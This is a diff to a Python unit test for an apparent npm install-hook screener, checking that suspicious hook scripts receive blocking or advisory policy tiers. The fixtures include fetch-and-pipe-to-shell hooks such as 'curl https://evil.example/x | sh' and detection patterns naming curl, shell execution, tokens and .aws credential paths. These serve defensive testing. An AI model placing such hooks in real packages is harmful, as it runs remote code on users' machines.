@@ -343,19 +343,32 @@ class MovedSelftestUnits(unittest.TestCase):
     def test_install_hook_prepare_decision_and_self_hooks(self):
         pat = {"network": [r"curl"], "exec": [r"\bsh\b"], "env_read": [r"TOKEN"], "credential_paths": [r"\.aws"], "ai_cli_abuse": []}
         dec = {"any_network_and_exec": "block", "exec_only": "advisory"}
-        fp = gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"prepare": "curl x | sh"},
-                                     patterns=pat, npm_scripts=["preinstall", "install", "postinstall", "prepare"], decision=dec)
-        self.assertEqual(fp["policy_tier"], "blocking")
-        fa = gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"postinstall": "node build.js | sh"},
-                                     patterns=pat, npm_scripts=["postinstall"], decision=dec)
-        self.assertEqual(fa["policy_tier"], "advisory")
-        fb = gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"postinstall": "node build.js | sh"},
-                                     patterns=pat, npm_scripts=["postinstall"], decision={"exec_only": "block"})
-        self.assertEqual(fb["policy_tier"], "blocking")
-        self.assertIsNone(gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"prepare": "curl x | sh"},
-                                                  patterns=pat, npm_scripts=["preinstall", "install", "postinstall"], decision=dec))
         with tempfile.TemporaryDirectory() as d:
-            pj = pathlib.Path(d, "package.json")
+            D = pathlib.Path(d).resolve()
+            CR = D / "cfg"
+            shutil.copytree(ROOT / "config/slopsquat", CR / "config/slopsquat")
+            shutil.copy(ROOT / "vibesec.yaml", CR / "vibesec.yaml")
+            base_cd = yaml.safe_load((CR / "config/slopsquat/cooldown.yaml").read_text(encoding="utf-8"))
+
+            def screen_pkg(scripts, npm_scripts, decision):
+                cd = dict(base_cd, install_hooks={"suspicious_patterns": pat, "npm_scripts": npm_scripts, "decision": decision})
+                (CR / "config/slopsquat/cooldown.yaml").write_text(yaml.safe_dump(cd, allow_unicode=True), encoding="utf-8")
+                proj = D / "proj"
+                proj.mkdir(exist_ok=True)
+                (proj / "package.json").write_text(json.dumps({"dependencies": {"fixture-pkg": "1.0.0"}}), encoding="utf-8")
+                reg = gr.FakeRegistry({("npm", "fixture-pkg", "1.0.0"): npm_clean("fixture-pkg", "1.0.0", scripts=scripts)})
+                env = gs.build_env(Policy(ROOT, project_root=None), git=FakeGit(), registry=reg, config_root=CR)
+                return gs.screen(gs.Request(target=proj, manifests=("package.json",)), env).findings
+
+            fp = screen_pkg({"prepare": "curl x | sh"}, ["preinstall", "install", "postinstall", "prepare"], dec)
+            self.assertEqual([f["policy_tier"] for f in fp], ["blocking"])
+            fa = screen_pkg({"postinstall": "node build.js | sh"}, ["postinstall"], dec)
+            self.assertEqual([f["policy_tier"] for f in fa], ["advisory"])
+            fb = screen_pkg({"postinstall": "node build.js | sh"}, ["postinstall"], {"exec_only": "block"})
+            self.assertEqual([f["policy_tier"] for f in fb], ["blocking"])
+            self.assertEqual(screen_pkg({"prepare": "curl x | sh"}, ["preinstall", "install", "postinstall"], dec), ())
+
+            pj = D / "package.json"
             pj.write_text(json.dumps({"scripts": {"postinstall": "curl https://evil.example/x | sh"}}), encoding="utf-8")
             self.assertIsNotNone(gs.self_install_hooks(self.env, pj))
 
